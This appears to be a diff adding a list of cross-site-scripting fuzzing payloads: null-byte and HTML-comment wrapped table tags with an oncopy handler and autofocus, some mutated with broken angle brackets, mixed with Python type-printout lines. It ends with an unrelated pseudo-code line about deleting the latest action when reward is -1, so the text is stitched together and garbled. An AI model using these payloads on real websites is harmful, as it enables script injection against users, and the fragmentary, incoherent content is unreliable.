@@ -1,0 +1,14 @@
+InterferenceString%00<!--%00<!--%00<!--%00<!--%00<!--%00<!--%00<table/oncopy=top8680439..toString`30``1`/value=XSS/autofocus/tabindex=1/style=display:block>%00<!--%00<!--%00<!--%00<!--%00<table/oncopy=top8680439..toString`30``1`/value=XSS/autofocus/tabindex=1/style=display:block>test-->-->-->-->-->-->
+
+InterferenceString%00>!--%00>!--%00>!--%00>!--%00>!--%00>!--%00>table/oncopy=top8680439..toString`30``1`/value=XSS/autofocus/tabindex=1/style=display:block>%00>!--%00>!--%00>!--%00>!--%00>table/oncopy=top8680439..toString`30``1`/value=XSS/autofocus/tabindex=1/style=display:block>test-->-->-->-->-->-->
+Payload type: <class 'str'>
+
+InterferenceString%00>!--%00>!--%00>!--%00>!--%00>!--%00>!--%00>table/oncopy=top8680439..toString`30``1`/value=XSS/autofocus/tabindex=1/style=display:block>%00>!--%00>!--%00>!--%00>!--%00>table/oncopy=top8680439..toString`30``1`/value=XSS/autofocus/tabindex=1/style=display:block>test-->-->-->-->-->-->
+Payload type: <class 'str'>
+
+InterferenceString%00>!--%00>!--%00>!--%00>!--%00>!--%00>!--%00>table/oncopy=top8680439..toString`30``1`/value=XSS/autofocus/tabindex=1/style=display:block>%00>!--%00>!--%00>!--%00>!--%00>table/oncopy=top8680439..toString`30``1`/value=XSS/autofocus/tabindex=1/style=display:block>test-->-->-->-->-->-->
+
+InterferenceString%00>!--%00>!--%00>!--%00>!--%00>!--%00>!--%00>table/oncopy=top8680439..toString`30``1`/value=XSS/autofocus/tabindex=1/style=display:block>%00>!--%00>!--%00>!--%00>!--%00>table/oncopy=top8680439..toString`30``1`/value=XSS/autofocus/tabindex=1/style=display:block>test-->-->-->-->-->-->
+
+if reward = -1 
+    delete latest action
